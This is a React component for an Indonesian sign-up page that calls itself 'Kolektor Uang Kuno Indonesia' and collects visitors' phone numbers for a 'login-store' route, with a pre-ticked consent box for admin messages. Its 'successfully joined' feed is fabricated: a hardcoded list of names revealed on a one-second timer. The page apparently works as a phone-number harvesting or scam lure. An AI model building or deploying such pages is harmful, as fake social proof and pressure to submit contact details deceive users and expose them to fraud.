import { useForm } from "@inertiajs/react";
import React, { useEffect, useRef, useState } from "react";
import CountryData from "./CountryCodesWithFlags";
import ArrowBackIosIcon from "@mui/icons-material/ArrowBackIos";
import { Checkbox, FormControlLabel, TextField } from "@mui/material";
export default function Index() {
    const [dataCode, setDataCode] = useState({
        name: "Indonesia",
        code: "+62",
    });
    const dataNama = [
        "Aisyah binti Abdul Rahman",
        "Ahmad bin Ismail",
        "Siti Nur Aisyah",
        "Zahra binti Ismail",
        "Farhan bin Khalid",
        "Mira binti Mohd Noor",
        "Ali bin Rashid",
        "Hana binti Shamsul",
        "Nadia binti Ahmad",
        "Kamal bin Ibrahim",
        "Aisyah binti Mohamad",
        "Zul bin Abidin",
        "Nabilah binti Abdul Razak",
        "Sulaiman bin Zainal",
        "Nina binti Ali",
        "Fahmi bin Azman",
        "Lina binti Mohd",
        "Nabil bin Ahmad",
        "Fatin binti Yusof",
        "Arif bin Ibrahim",
        "Azizah binti Rahman",
        "Ibrahim bin Yassin",
        "Liyana binti Faris",
        "Adam bin Zulkifli",
        "Rina binti Ismail",
        "Khalid bin Omar",
        "Mariam binti Ali",
        "Sharifah binti Abdillah",
        "Zuraida binti Mohamad",
        "Aina binti Sulaiman",
        "Syafiq bin Abdul Rahman",
        "Maira binti Idris",
        "Firdaus bin Ali",
        "Rafidah binti Zainal",
        "Fadhil bin Ali",
        "Nurul binti Hisham",
        "Rizal bin Mohd Noor",
        "Shaza binti Khalid",
        "Ismail bin Abu",
        "Nora binti Salleh",
        "Syakir bin Ibrahim",
        "Sarah binti Mohd",
        "Rizwan bin Razak",
        "Fayza binti Mohd",
        "Haziq bin Hassan",
        "Aminah binti Zainal",
        "Zainal bin Mohd Noor",
        "Amir bin Ali",
        "Ainul binti Kamal",
        "Siti Mariam binti Hassan",
        "Faiz bin Ramli",
        "Syarifah binti Zulkifli",
        "Mimi binti Ibrahim",
        "Afiqah binti Safwan",
        "Norliza binti Ahmad",
        "Rasul bin Ali",
        "Fathimah binti Abdul Wahid",
        "Mokhtar bin Abd Rahman",
        "Haziqah binti Ahmad",
        "Zainab binti Ali",
        "Razak bin Samad",
        "Shakila binti Ibrahim",
        "Hassan bin Nordin",
        "Zubair bin Saad",
        "Rina binti Yahya",
        "Nour binti Abdillah",
        "Faris bin Mohd",
        "Hanafi bin Ismail",
        "Azman bin Ahmad",
        "Fatimah binti Mohd",
        "Najwa binti Yusuf",
        "Rizwan bin Rani",
        "Huda binti Asma",
        "Azra binti Ahmad",
        "Ikram bin Omar",
        "Jamilah binti Abdullah",
        "Fizah binti Aziz",
        "Farah binti Ismail",
        "Wani binti Ahmad",
        "Anwar bin Hassan",
        "Rosmah binti Ibrahim",
        "Farrin binti Zahid",
        "Yusof bin Osman",
        "Shamsul bin Sulaiman",
        "Azeem bin Rashid",
        "Alya binti Ali",
        "Rifqi bin Farhan",
        "Nisa binti Idris",
        "Diana binti Sulaiman",
        "Nabilah binti Farid",
        "Khairul bin Nordin",
        "Raya binti Jamal",
        "Mariam binti Ramli",
        "Siti Aisyah binti Noor",
        "Syahira binti Mahmud",
        "Shafie bin Zulkifli",
        "Danial bin Omar",
        "Raja binti Azman",
        "Azreen binti Salleh",
        "Rilla binti Ibrahim",
        "Hafiz bin Rashid",
        "Zahira binti Mohd",
        "Asyraf bin Mohamad",
        "Mika binti Ali",
        "Rania binti Faris",
        "Siti Nur binti Ibrahim",
        "Shakirah binti Yusuf",
        "Hana binti Zakaria",
        "Zakia binti Abdullah",
        "Jazlin binti Ismail",
        "Shamsuddin bin Ismail",
        "Nabil bin Abidin",
        "Fahmi bin Muhammad",
        "Aziza binti Osman",
        "Safira binti Faris",
        "Zakaria bin Ali",
        "Syamil bin Azman",
        "Azimah binti Zainal",
        "Khairani binti Ibrahim",
        "Razali bin Ahmad",
        "Abdul Rahman bin Hisham",
        "Ain binti Nasir",
        "Fakhrul bin Zainal",
        "Afiq bin Omar",
        "Nur binti Samad",
        "Rijal bin Abidin",
        "Fahira binti Salim",
        "Rizq bin Mohd",
        "Anis binti Omar",
        "Mira binti Kamal",
        "Ainul binti Azman",
        "Fahmi bin Saad",
        "Rashidah binti Mohd",
        "Elina binti Ibrahim",
        "Zain bin Abdullah",
        "Zara binti Ali",
        "Syazwan bin Yusof",
        "Firas bin Ali",
        "Khairul bin Kamal",
        "Nadia binti Shamsul",
        "Shazwan bin Mohd",
        "Raihan bin Zainal",
        "Aslam bin Ibrahim",
        "Yasmin binti Omar",
        "Hafizah binti Ali",
    ];

    const [show, setShow] = useState(15);
    const containerRef = useRef(null);
    const [countryData, setCountryData] = useState(CountryData);
    useEffect(() => {
        if (dataCode.name === "") {
            setCountryData(CountryData);
        } else {
            const filter = countryData.filter((country) =>
                country.name.toLowerCase().includes(dataCode.name.toLowerCase())
            );

            setCountryData(filter);
            // const filtered = countriesData.filter(country =>
            //   country.country.toLowerCase().includes(searchTerm.toLowerCase())
            // );
        }
    }, [dataCode.name]);
    const { data, setData, post } = useForm({ phone: "+62", code: "+62" });

    const [activeInput, setActiveInput] = useState(false);
    const inputRef = useRef();

    let handler = (e) => {
        if (inputRef.current && !inputRef.current.contains(e.target)) {
            setActiveInput(false);
        }
    };

    useEffect(() => {
        document.addEventListener("click", handler);
        return () => {
            document.removeEventListener("click", handler);
        };
    }, []);

    const handlerChange = (e) => {
        setData({
            ...data,
            phone: e.target.value,
        });
    };
    const countryChange = (e) => {
        setDataCode({ ...dataCode, name: e.target.value });
    };
    const submitHandler = async (e) => {
        e.preventDefault();
        post(route("login-store"));
    };
    useEffect(() => {
        const interval = setInterval(() => {
            setShow((prev) => prev + 1);
        }, 1000);

        // Clear interval saat komponen unmount
        return () => clearInterval(interval);
    }, []);
    useEffect(() => {
        if (containerRef.current) {
            containerRef.current.scrollTop = containerRef.current.scrollHeight;
        }
    }, [show]);
    return (
        <div className="flex flex-row justify-center items-center py-8">
            <div className="w-[400px]">
                <img
                    src="/kolektor/gambar.jpg"
                    alt=""
                    className="w-full h object-contain object-bottom"
                />
                <marquee behavior="" direction="">
                    <h3 className="text-center py-4 uppercase font-medium tracking-tighter leading-7 text-2xl text-blue-500">
                        silahkan isi data anda dengan benar di bawah ini
                    </h3>
                </marquee>
                <h3 className="text-center py-4 uppercase font-bold tracking-tighter leading-7 text-3xl text-blue-500">
                    Kolektor Uang Kuno Indonesia
                </h3>
                <form
                    onSubmit={submitHandler}
                    action=""
                    className="w-full my-8"
                >
                    <div className="relative w-full mt-6">
                        <TextField
                            onChange={countryChange}
                            size="small"
                            value={dataCode.name}
                            ref={inputRef}
                            onClick={() => setActiveInput(true)}
                            className=" border-none outline-none w-full mt-8 rounded-lg "
                            id="outlined-basic"
                            label="Country"
                            variant="outlined"
                        />
                        <div className="absolute  top-0 right-0 w-10 h-full flex items-center justify-end px-4 rounded-lg">
                            <p
                                className={`text-gray-500 text-lg ${
                                    activeInput ? "rotate-90" : "rotate-0"
                                } duration-300 ease-in-out transition-all`}
                            >
                                <ArrowBackIosIcon
                                    color="inherit"
                                    fontSize="inherit"
                                />
                            </p>
                        </div>
                        <div
                            className={`${
                                activeInput ? "" : "hidden"
                            } rounded-md  shadow-lg shadow-gray-900/50 absolute top-14 p-4 overflow-hidden max-h-[200px] z-[999999] bg-white`}
                        >
                            <div className=" bg-white max-h-[350px] overflow-y-scroll scrollbar-none scrollbar-thin">
                                {countryData.map((item, key) => (
                                    <div
                                        onClick={() => {
                                            setDataCode({
                                                ...dataCode,
                                                code: item.dial_code,
                                                name: item.name,
                                            });
                                            setData({
                                                ...data,
                                                phone: item.dial_code,
                                                code: item.dial_code,
                                            });
                                        }}
                                        key={key}
                                        className="hover:bg-gray-400/50 hover:cursor-pointer rounded-md px-3  flex justify-between w-full items-center "
                                    >
                                        <div className="flex gap-5 items-center py-3">
                                            <img
                                                className="w-10"
                                                src={`https://flagcdn.com/w40/${item.code.toLowerCase()}.png`}
                                                alt=""
                                            />
                                            <p>{item.name}</p>
                                        </div>
                                        <p className="text-gray-500 font-light text-sm">
                                            {item.dial_code}
                                        </p>
                                    </div>
                                ))}
                            </div>
                        </div>
                    </div>
                    <div className="relative w-full mt-3">
                        {data.phone === "" && (
                            <div className="w-full h-full flex items-center px-4 absolute top-0 left-0">
                                <p>{dataCode.code}</p>
                            </div>
                        )}
                        <TextField
                            size="small"
                            onChange={handlerChange}
                            value={data.phone}
                            placeholder="--- ---- ----"
                            id="outlined-basic"
                            variant="outlined"
                            label="Phone Number"
                            className="w-full  px-8 "
                        />
                    </div>
                    <div className="flex items-center gap-4 px-4 w-full">
                        <FormControlLabel
                            className="rounded-md"
                            control={
                                <Checkbox
                                    sx={{
                                        "& .MuiSvgIcon-root": { fontSize: 20 },
                                    }}
                                    defaultChecked
                                />
                            }
                            label="Saya setuju untuk menerima pesan dari admin buat jual beli uang kuno"
                        />
                    </div>
                    <button className="bg-blue-500 text-white py-3 my-5 rounded-lg w-full">
                        MENDAFTAR
                    </button>
                </form>
                <div
                    style={{
                        scrollBehavior: "smooth", // Menambahkan animasi scroll
                    }}
                    ref={containerRef}
                    className="bg-slate-100 rounded-md flex flex-col gap-y-2 py-12 px-4 w-full  min-h-[150px] md:min-h-[550px] max-h-[350px] md:max-h-[900px] overflow-y-hidden"
                >
                    {dataNama.map(
                        (item, key) =>
                            key < show && (
                                <div
                                    // style={{
                                    //     animationDelay: `${key * 100}ms`, // Penundaan animasi untuk efek yang lebih alami
                                    // }}
                                    key={key}
                                    className={`transition-all duration-300 ease-linear flex gap-4 items-center bg-white py-3 px-4 leading-3 rounded-md shadow-sm shadow-gray-400/50 ${
                                        key - 1 == show && "fade-in"
                                    }`}
                                >
                                    <img
                                        src="avatar.png"
                                        alt=""
                                        className="w-12 rounded-full"
                                    />
                                    <div>
                                        <p className="font-bold text-lg md:text-xl lg:text-2xl  leading-5">
                                            {item}
                                        </p>
                                        <p className="font-thin text-green-500 text-sm leading-5">
                                            - Berhasil Bergabung
                                        </p>
                                    </div>
                                </div>
                            )
                    )}
                </div>
            </div>
        </div>
    );
}
